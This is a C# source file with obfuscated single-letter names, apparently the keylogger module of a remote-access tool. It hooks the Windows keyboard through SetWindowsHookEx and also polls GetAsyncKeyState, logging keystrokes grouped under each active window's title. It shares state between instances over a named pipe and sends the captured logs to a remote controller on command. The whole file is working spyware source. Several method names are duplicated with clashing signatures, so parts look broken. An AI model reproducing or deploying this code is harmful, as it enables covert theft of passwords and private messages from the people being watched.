using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace P
{
    public class M
    {
        bool A = false;
        bool B = true;
        bool C = false;
        IntPtr D = IntPtr.Zero;
        CancellationTokenSource E = new CancellationTokenSource();
        Dictionary<string, string> F;
        string G = "OfflineKeyloggerPipe";
        NamedPipeClientStream H;
        Process I;

        public async Task J(Process K)
        {
            await K.SendAsync(new byte[] { 3 });
            I = K;
            try
            {
                if (!L())
                {
                    M();
                }
                else
                {
                    B = false;
                    H = new NamedPipeClientStream(".", G, PipeDirection.InOut, PipeOptions.Asynchronous);
                    await H.ConnectAsync();
                }
                await K.SendAsync(new byte[] { 1 });
            }
            catch
            {
                await K.SendAsync(new byte[] { 0 });
                await Task.Delay(1000);
                return;
            }
            while (K.Connected())
            {
                try
                {
                    byte[] N = await K.ReceiveAsync();
                    Console.WriteLine(N[0]);
                    if (N == null)
                    {
                        break;
                    }
                    else if (N[0] == 0)
                    {
                        byte[] O = new byte[] { 0 };
                        if (await P())
                        {
                            O = new byte[] { 1 };
                        }
                        await K.SendAsync(O);
                    }
                    else if (N[0] == 1)
                    {
                        Console.WriteLine("start");
                        Q();
                    }
                    else if (N[0] == 2)
                    {
                        await R();
                    }
                    else if (N[0] == 3)
                    {
                        Dictionary<string, string> S = await T();
                        byte[] U = V(S);
                        await K.SendAsync(U);
                    }
                    else if (N[0] == 4)
                    {
                        await W();
                        K.Disconnect();
                        break;
                    }
                }
                catch (Exception X)
                {
                    K.Disconnect();
                    break;
                }
            }
            if (B)
            {
                while (!C)
                {
                    await Task.Delay(1000);
                }
            }
        }

        public bool L()
        {
            return Directory.GetFiles(@"\\.\pipe\").Contains($@"\\.\pipe\{G}");
        }

        public async Task M()
        {
            F = new Dictionary<string, string>();
            while (!C)
            {
                NamedPipeServerStream Y = new NamedPipeServerStream(G, PipeDirection.InOut, 254, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
                await Y.WaitForConnectionAsync(E.Token);
                if (C)
                {
                    Y.Dispose();
                    break;
                }
                Z(Y);
            }
        }

        public async Task Z(NamedPipeServerStream aa)
        {
            while (!C)
            {
                byte[] ba = new byte[] { 0 };
                int ca = 0;
                try
                {
                    ca = await aa.ReadAsync(ba, 0, 1, E.Token);
                }
                catch { }
                if (ca == 0)
                {
                    try
                    {
                        aa.Disconnect();
                    }
                    catch { }
                    aa.Dispose();
                    break;
                }
                if (ba[0] == 1)
                {
                    byte da = 0;
                    if (A)
                    {
                        da = 1;
                    }
                    try
                    {
                        await aa.WriteAsync(new byte[] { 1, da }, 0, 2);
                    }
                    catch { }
                }
                else if (ba[0] == 2)
                {
                    A = true;
                }
                else if (ba[0] == 3)
                {
                    A = false;
                }
                else if (ba[0] == 4)
                {
                    try
                    {
                        byte[] ea = new byte[] { 4 };
                        byte[] fa = V(F);
                        byte[] ga = Utils.IntToBytes(fa.Length);
                        byte[] ha = SocketHandler.Concat(ga, fa);
                        byte[] ia = SocketHandler.Concat(ea, ha);
                        await aa.WriteAsync(ia, 0, ia.Length);
                    }
                    catch { }
                }
                else if (ba[0] == 5)
                {
                    C = true;
                    try
                    {
                        E.Cancel();
                        E.Dispose();
                        aa.Dispose();
                    }
                    catch { }
                    return;
                }
            }
        }

        public async Task W()
        {
            if (B)
            {
                C = true;
                E.Cancel();
                E.Dispose();
                if (D != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(D);
                    D = IntPtr.Zero;
                }
                return;
            }
            try
            {
                await H.WriteAsync(new byte[] { 5 }, 0, 1);
            }
            catch { }
        }

        public IntPtr X(int ba, IntPtr bb, IntPtr bc)
        {
            if (A && ba >= 0 && bb == (IntPtr)WM_KEYDOWN)
            {
                int bd = Marshal.ReadInt32(bc);
                bool be = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                string bf = Y((uint)bd, be);
                string bg = Utils.GetCaptionOfActiveWindow().Replace("*", "");
                if ((((ushort)GetKeyState(0x14)) & 0xffff) != 0)
                {
                    bf = bf.ToUpper();
                }
                if (!F.ContainsKey(bg))
                {
                    F.Add(bg, "");
                }
                F[bg] += bf;
            }
            return CallNextHookEx(IntPtr.Zero, ba, bb, bc);
        }

        public async Task Y()
        {
            while (!C)
            {
                if (!A)
                {
                    await Task.Delay(1000);
                }
                string bh = await Z();
                if (bh != null)
                {
                    string bi = (await Utils.GetCaptionOfActiveWindowAsync()).Replace("*", "");
                    if (!F.ContainsKey(bi))
                    {
                        F.Add(bi, "");
                    }
                    F[bi] += bh;
                }
            }
        }

        private static byte[] V(Dictionary<string, string> bj)
        {
            List<byte> bk = new List<byte>();

            foreach (var bl in bj)
            {
                bk.AddRange(Encoding.UTF8.GetBytes(bl.Key));
                bk.Add(0);
                bk.AddRange(Encoding.UTF8.GetBytes(bl.Value));
                bk.Add(0);
            }

            return bk.ToArray();
        }

        private static Dictionary<string, string> W(byte[] bm, int bn)
        {
            Dictionary<string, string> bo = new Dictionary<string, string>();
            string bp = null;
            StringBuilder bq = new StringBuilder();

            for (int br = bn; br < bm.Length; br++)
            {
                byte bs = bm[br];

                if (bs == 0)
                {
                    if (bp == null)
                    {
                        bp = bq.ToString();
                        bq.Clear();
                    }
                    else
                    {
                        bo[bp] = bq.ToString();
                        bp = null;
                        bq.Clear();
                    }
                }
                else
                {
                    bq.Append((char)bs);
                }
            }

            return bo;
        }

        public async Task<Dictionary<string, string>> T(int bo = 0)
        {
            if (bo > 3)
            {
                return null;
            }
            if (B)
            {
                return F;
            }
            await H.WriteAsync(new byte[] { 4 }, 0, 1);
            byte[] bt = new byte[] { 0, 0, 0, 0, 0 };
            CancellationTokenSource bu = new CancellationTokenSource(2000);
            try
            {
                await H.ReadAsync(bt, 0, 5, bu.Token);
            }
            catch { }
            bu.Dispose();
            if (bt[0] == 4)
            {
                int bv = I.sock.BytesToInt(bt, 1);
                bu = new CancellationTokenSource(5000);
                bt = new byte[bv];
                int bw = 0;
                try
                {
                    int bx = 0;

                    while (bx < bv)
                    {
                        bw = await H.ReadAsync(bt, bx, bv - bx, bu.Token);
                        if (bw == 0)
                        {
                            bw = 0;
                            break;
                        }
                        bx += bw;
                    }
                }
                catch
                {
                    bw = 0;
                }
                bu.Dispose();
                if (bw == 0)
                {
                    return await T(bo + 1);
                }
                return W(bt, 0);
            }
            else
            {
                return await T(bo + 1);
            }
        }
        public async Task Q()
        {
            if (B && !A)
            {
                HookCallbackDelegate by = X;
                I = Process.GetCurrentProcess();
                string bz = I.MainModule.ModuleName;
                I.Dispose();
                B = true;
                new Thread(() =>
                {
                    D = SetWindowsHookEx(WH_KEYBOARD_LL, by, GetModuleHandle(bz), 0);
                    if (!Application.MessageLoop)
                    {
                        Application.Run();
                    }
                }).Start();
                return;
            }
            await H.WriteAsync(new byte[] { 2 }, 0, 1);
        }
        public async Task R()
        {
            if (B)
            {
                A = false;

                if (D != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(D);
                    D = IntPtr.Zero;
                }

                return;
            }
            await H.WriteAsync(new byte[] { 3 }, 0, 1);
        }
        public async Task<bool> P(int bx = 0)
        {
            if (bx > 3)
            {
                return false;
            }
            if (B)
            {
                return A;
            }
            await H.WriteAsync(new byte[] { 1 }, 0, 1);
            byte[] cb = new byte[] { 0, 0 };
            CancellationTokenSource cc = new CancellationTokenSource(3000);
            await H.ReadAsync(cb, 0, 2, cc.Token);
            cc.Dispose();
            if (cb[0] == 1)
            {
                return cb[1] == 1;
            }
            else
            {
                return await P(bx + 1);
            }
        }
        private async Task<string> Z()
        {
            return await Task.Run(() =>
            {
                for (int cd = 0; cd < 255; cd++)
                {
                    short ce = GetAsyncKeyState(cd);

                    if ((ce & 0x8000) != 0 && !cf[cd])
                    {
                        cf[cd] = true;

                        bool cg = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                        string ch = Y((uint)cd, cg);
                        return ch;
                    }
                    else if ((ce & 0x8000) == 0 && cf[cd])
                    {
                        cf[cd] = false;
                    }
                }
                return null;
            });
        }

        private static Dictionary<uint, string> ci = new Dictionary<uint, string>()
        {
            { 0x08, "[backspace]" },
            { 0x09, "[tab]" },
            { 0x0D, "[enter]" },
            { 0x1B, "[escape]" },
            { 0x20, "[space]" },
            { 0x2E, "[delete]" },
            { 0x25, "[left]" },
            { 0x26, "[up]" },
            { 0x27, "[right]" },
            { 0x28, "[down]" },
            { 0x2C, "[print screen]" },
            { 0x2D, "[insert]" },
            { 0x2F, "[help]" },
            { 0x5B, "[left windows]" },
            { 0x5C, "[right windows]" },
            { 0x5D, "[applications]" },
            { 0x5F, "[sleep]" },
            { 0x70, "[F1]" },
            { 0x71, "[F2]" },
            { 0x72, "[F3]" },
            { 0x73, "[F4]" },
            { 0x74, "[F5]" },
            { 0x75, "[F6]" },
            { 0x76, "[F7]" },
            { 0x77, "[F8]" },
            { 0x78, "[F9]" },
            { 0x79, "[F10]" },
            { 0x7A, "[F11]" },
            { 0x7B, "[F12]" },
            { 0xBA, ";" },
            { 0xBB, "=" },
            { 0xBC, "," },
            { 0xBD, "-" },
            { 0xBE, "." },
            { 0xBF, "/" },
            { 0xC0, "`" },
            { 0xDB, "[" },
            { 0xDC, "\\" },
            { 0xDD, "]" },
            { 0xDE, "'" },
            { 0xDF, "[caps lock]" },
            { 0xE1, "[ime hangul mode]" },
            { 0xE3, "[ime junja mode]" },
            { 0xE4, "[ime final mode]" },
            { 0xE5, "[ime kanji mode]" },
            { 0xE6, "[ime hanja mode]" },
            { 0xE8, "[ime off]" },
            { 0xE9, "[ime on]" },
            { 0xEA, "[ime convert]" },
            { 0xEB, "[ime non-convert]" },
            { 0xEC, "[ime accept]" },
            { 0xED, "[ime mode change request]" },
            { 0xF1, "[oem specific]" },
            { 0xFF, "[oem auto]" },
            { 0xFE, "[oem enlarge window]" },
            { 0xFD, "[oem reduce window]" },
            { 0xFC, "[oem copy]" },
            { 0xFB, "[oem enlarge font]" },
            { 0xFA, "[oem reduce font]" },
            { 0xF9, "[oem jump]" },
            { 0xF8, "[oem pa1]" },
            { 0xF7, "[oem clear]" }
        };

        private static bool[] cf = new bool[256];

        private static string Y(uint cl, bool cm)
        {
            StringBuilder cn = new StringBuilder(5);
            byte[] co = new byte[256];

            co[0x10] = (byte)(cm ? 0x80 : 0);

            int cp = ToUnicode(cl, 0, co, cn, cn.Capacity, 0);

            if (cp > 0)
            {
                string cq = cn.ToString();

                if (ci.ContainsKey(cl))
                {
                    string cr = ci[cl];

                    if (cm)
                    {
                        switch (cr)
                        {
                            case ";":
                                return ":";
                            case "=":
                                return "+";
                            case ",":
                                return "<";
                            case "-":
                                return "_";
                            case ".":
                                return ">";
                            case "/":
                                return "?";
                            case "`":
                                return "~";
                            case "[":
                                return "{";
                            case "\\":
                                return "|";
                            case "]":
                                return "}";
                            case "'":
                                return "\"";
                        }
                    }

                    return cr;
                }

                return cq;
            }

            return string.Empty;
        }

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int cl);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int cl);

        public delegate IntPtr HookCallbackDelegate(int cl, IntPtr cm, IntPtr cn);

        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int cl, HookCallbackDelegate cm, IntPtr cn, uint co);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr cp);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string cl);
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr cp, int cl, IntPtr cm, IntPtr cn);

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x100;


        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint cl, uint cm, byte[] co,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder cn,
            int cp, uint cq);
}
}
